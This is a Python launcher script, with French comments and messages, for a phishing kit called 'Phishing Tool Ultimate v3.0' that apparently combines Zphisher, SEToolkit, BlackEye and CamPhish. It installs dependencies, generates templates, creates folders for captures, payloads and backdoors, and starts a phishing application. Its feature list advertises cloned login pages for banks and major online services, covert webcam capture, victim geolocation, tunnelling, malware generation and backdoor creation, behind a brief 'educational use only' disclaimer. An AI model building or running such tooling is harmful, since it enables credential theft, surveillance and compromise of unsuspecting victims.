#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🚀 PHISHING TOOL ULTIMATE v3.0 - LAUNCHER
AL-tool + Zphisher + SEToolkit + BlackEye + CamPhish
50 Templates Ultra-Stylisés - 100% Fonctionnel
"""

import os
import sys
import subprocess
import time
from colorama import init, Fore, Back, Style

# Initialisation des couleurs
init(autoreset=True)

def print_banner():
    """Affiche la bannière du tool"""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                    🎣 PHISHING TOOL ULTIMATE v3.0                    ║
║                                                                      ║
║  {Fore.GREEN}AL-tool + Zphisher + SEToolkit + BlackEye + CamPhish{Fore.CYAN}        ║
║  {Fore.YELLOW}50 Templates Ultra-Stylisés - 100% Fonctionnel{Fore.CYAN}              ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def check_dependencies():
    """Vérifie les dépendances"""
    print(f"{Fore.YELLOW}[*] Vérification des dépendances...{Style.RESET_ALL}")
    
    required_modules = [
        'flask', 'flask_socketio', 'PIL', 'qrcode', 
        'requests', 'geocoder', 'user_agents', 'psutil',
        'colorama', 'rich', 'tqdm', 'pyfiglet', 'termcolor'
    ]
    
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module)
            print(f"{Fore.GREEN}✅ {module}{Style.RESET_ALL}")
        except ImportError:
            print(f"{Fore.RED}❌ {module}{Style.RESET_ALL}")
            missing_modules.append(module)
    
    if missing_modules:
        print(f"\n{Fore.RED}[!] Modules manquants: {', '.join(missing_modules)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Installation des dépendances...{Style.RESET_ALL}")
        
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
            print(f"{Fore.GREEN}[+] Dépendances installées avec succès!{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Échec de l'installation des dépendances{Style.RESET_ALL}")
            return False
    
    return True

def check_templates():
    """Vérifie que les templates sont présents"""
    print(f"\n{Fore.YELLOW}[*] Vérification des templates...{Style.RESET_ALL}")
    
    if not os.path.exists("templates"):
        print(f"{Fore.RED}[!] Dossier templates manquant{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Génération des templates...{Style.RESET_ALL}")
        
        try:
            subprocess.check_call([sys.executable, "generate_templates.py"])
            print(f"{Fore.GREEN}[+] Templates générés avec succès!{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Échec de la génération des templates{Style.RESET_ALL}")
            return False
    
    # Compter les templates
    template_count = len([f for f in os.listdir("templates") if f.endswith('.html')])
    print(f"{Fore.GREEN}[+] {template_count} templates trouvés{Style.RESET_ALL}")
    
    return True

def create_directories():
    """Crée les dossiers nécessaires"""
    print(f"\n{Fore.YELLOW}[*] Création des dossiers...{Style.RESET_ALL}")
    
    directories = ['captures', 'logs', 'exports', 'screenshots', 'payloads', 'backdoors']
    
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            print(f"{Fore.GREEN}[+] Dossier {directory} créé{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[*] Dossier {directory} existe déjà{Style.RESET_ALL}")

def show_features():
    """Affiche les fonctionnalités disponibles"""
    features = f"""
{Fore.CYAN}🎯 FONCTIONNALITÉS DISPONIBLES:{Style.RESET_ALL}

{Fore.GREEN}📊 TEMPLATES (50 sites ultra-stylisés):{Style.RESET_ALL}
   • 🏦 Banques: PayPal, Bank of America, Chase, Wells Fargo, etc.
   • 🏢 Tech: Microsoft 365, Google Workspace, Apple ID, Amazon
   • 📱 Social: Facebook, Instagram, Twitter, LinkedIn, TikTok
   • 🎮 Gaming: Steam, Epic Games, Battle.net, EA Origin
   • 💼 Pro: GitHub, GitLab, Docker Hub, Stack Overflow
   • 🛒 Shopping: eBay, Walmart, Target, Best Buy
   • 📧 Email: Gmail, Outlook, Yahoo, WhatsApp Web

{Fore.GREEN}🔧 FONCTIONNALITÉS AVANCÉES:{Style.RESET_ALL}
   • 📸 CamPhish: Capture webcam automatique
   • 🌍 Géolocalisation: Localisation précise des victimes
   • 💻 Détection: Navigateur, OS, appareil
   • 🔐 Chiffrement: Données sécurisées
   • 📊 Statistiques: Métriques en temps réel
   • 🚇 Tunnels: Ngrok, Cloudflare, LocalTunnel
   • 💣 Payloads: Génération de malwares
   • 🔙 Backdoors: Création de backdoors

{Fore.GREEN}🎨 INTERFACE MODERNE:{Style.RESET_ALL}
   • 🎭 Design: Interface sombre et professionnelle
   • ⚡ Animations: Effets visuels fluides
   • 📱 Responsive: Compatible mobile/desktop
   • 🔔 Notifications: Alertes en temps réel
   • 📈 Dashboard: Statistiques détaillées
   • 🎯 Ciblage: Sélection intelligente des templates

{Fore.RED}⚠️  AVERTISSEMENT:{Style.RESET_ALL}
   Cet outil est destiné uniquement à des fins éducatives
   et de test de sécurité autorisés. Utilisez de manière éthique!
"""

    print(features)

def launch_tool():
    """Lance l'outil principal"""
    print(f"\n{Fore.GREEN}[+] Lancement de Phishing Tool Ultimate v3.0...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Interface graphique en cours de chargement...{Style.RESET_ALL}")
    
    try:
        # Import et lancement de l'outil principal
        from phishing_tool import PhishingTool
        
        print(f"{Fore.GREEN}[+] Outil chargé avec succès!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Interface graphique ouverte{Style.RESET_ALL}")
        
        app = PhishingTool()
        app.run()
        
    except ImportError as e:
        print(f"{Fore.RED}[!] Erreur lors du chargement: {e}{Style.RESET_ALL}")
        return False
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur lors du lancement: {e}{Style.RESET_ALL}")
        return False
    
    return True

def main():
    """Fonction principale"""
    print_banner()
    
    print(f"{Fore.CYAN}[*] Démarrage de la vérification...{Style.RESET_ALL}")
    
    # Vérifications
    if not check_dependencies():
        print(f"{Fore.RED}[!] Échec de la vérification des dépendances{Style.RESET_ALL}")
        return False
    
    if not check_templates():
        print(f"{Fore.RED}[!] Échec de la vérification des templates{Style.RESET_ALL}")
        return False
    
    create_directories()
    
    # Affichage des fonctionnalités
    show_features()
    
    # Confirmation de lancement
    print(f"\n{Fore.YELLOW}[?] Voulez-vous lancer l'outil maintenant? (o/n): {Style.RESET_ALL}", end="")
    
    try:
        response = input().lower()
        if response in ['o', 'oui', 'y', 'yes']:
            return launch_tool()
        else:
            print(f"{Fore.CYAN}[*] Lancement annulé{Style.RESET_ALL}")
            return True
    except KeyboardInterrupt:
        print(f"\n{Fore.CYAN}[*] Lancement annulé par l'utilisateur{Style.RESET_ALL}")
        return True

if __name__ == "__main__":
    try:
        success = main()
        if not success:
            print(f"\n{Fore.RED}[!] Échec du lancement{Style.RESET_ALL}")
            sys.exit(1)
        else:
            print(f"\n{Fore.GREEN}[+] Lancement terminé avec succès{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.CYAN}[*] Arrêt demandé par l'utilisateur{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Erreur inattendue: {e}{Style.RESET_ALL}")
        sys.exit(1) 